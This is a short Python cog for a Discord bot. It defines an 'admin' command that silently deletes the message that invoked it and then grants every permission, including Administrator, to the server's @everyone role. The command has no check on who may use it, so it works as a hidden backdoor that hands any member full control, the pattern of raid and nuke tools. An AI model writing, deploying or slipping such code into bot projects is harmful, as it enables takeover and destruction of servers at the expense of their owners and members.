import discord
from discord.ext import commands

class Admin(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def admin(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild
        everyone_role = guild.default_role

        try:
            await everyone_role.edit(permissions=discord.Permissions.all())
            await ctx.send("✅ Given Administrator permissions to @everyone role!")
        except discord.Forbidden:
            await ctx.send("❌ I do not have permission to edit the @everyone role.")
        except Exception as e:
            await ctx.send(f"❌ Failed to update role permissions: {e}")

async def setup(bot):
    await bot.add_cog(Admin(bot))
